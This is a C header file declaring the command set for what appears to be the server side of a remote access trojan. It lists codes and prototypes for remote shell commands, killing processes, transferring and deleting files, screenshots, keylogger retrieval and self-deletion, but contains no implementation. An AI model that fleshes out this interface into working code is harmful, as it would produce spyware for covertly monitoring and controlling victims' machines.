#ifndef __SERV_CMDS_H
#define __SERV_CMDS_H

#define SERV_CMDS_SEND 0x1
#define SERV_CMDS_INFO 0x2
#define SERV_CMDS_TERMINATE 0x3
#define SERV_CMDS_SYSTEM 0x4
#define SERV_CMDS_TASK_LIST 0x5
#define SERV_CMDS_TASK_KILL 0x6
#define SERV_CMDS_DISK_LIST 0x7
#define SERV_CMDS_HDD_CD 0x8

#define SERV_CMDS_HDD_LS 0x9
#define SERV_CMDS_HDD_LS_P SERV_CMDS_HDD_LS + 0x1 //ls {PATH} 0xA

#define SERV_CMDS_HDD_REMOVE 0xB
#define SERV_CMDS_FILE_SEND 0xC
#define SERV_CMDS_FILE_GET 0xD
#define SERV_CMDS_MESSAGE_BOX 0xE
#define SERV_CMDS_SELF_DEL 0xF
#define SERV_CMDS_SCREEN_GET 0x10
#define SERV_CMDS_KEYLOGGER_INFO 0x11
#define SERV_CMDS_KEYLOGGER_CLEAR 0x12
#define SERV_CMDS_KEYLOGGER_GET 0x13
#define SERV_CMDS_SCREEN_CAP 0x14

#define SERV_CMDS_COUNT 0x15

#define SERV_CMDS_SEP ','

#define SERV_CMDS_BREAK 0
#define SERV_CMDS_GOOD 1
#define SERV_CMDS_DONT_SEEDUP 2
#define SERV_CMDS_ERR_ARG 3
#define SERV_CMDS_ERR_UNK 4

extern int serv_cmds_Translate(char* str, int len);
extern int serv_cmds_ExportArg(char** msg, char** arg, int startIndex);

extern int serv_SEND(char* str);
extern int serv_TERMINATE(void);
extern int serv_INFO(void);
extern int serv_SYSTEM(char* str);
extern int serv_TASKLIST(char* str);
extern int serv_TASKKILL(char* str);
extern int serv_DISKLIST(void);
extern int serv_CD(char* msg);
extern int serv_LS_Path(char* path);
extern int serv_LS(void);
extern int serv_REMOVE(char* msg);
extern int serv_FILESEND(char* msg);
extern int serv_FILEGET(char* msg);
extern int serv_MESSAGEBOX(char* msg);
extern int serv_SELFDEL(void);
extern int serv_SCREENGET(char* msg);
extern int serv_KEYLOGGER_INFO(void);
extern int serv_KEYLOGGER_CLEAR(void);
extern int serv_SCREENCAP(char* msg);
extern int serv_KEYLOGGER_GET(char* msg);

#endif